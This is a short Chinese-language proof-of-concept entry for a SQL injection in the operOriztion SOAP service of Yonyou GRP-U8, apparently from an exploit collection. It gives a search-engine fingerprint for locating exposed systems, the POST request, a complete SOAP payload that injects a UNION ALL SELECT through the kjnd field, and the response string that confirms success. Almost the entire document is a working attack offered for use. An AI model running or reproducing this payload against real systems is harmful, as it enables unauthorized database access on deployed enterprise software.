# 用友GRP-U8operOriztionSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-GRP-U8"`
- **请求**：`POST /services/operOriztion HTTP/1.1`

**Payload**
```
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
<soapenv:Header/>
<soapenv:Body>
<wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<kjnd xsi:type="xsd:string">' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','123456'))-- </kjnd>
</wsdd:getGsbmfaByKjnd>
</soapenv:Body>
</soapenv:Envelope>
```
- **响应特征**：200 49ba59abbe56e057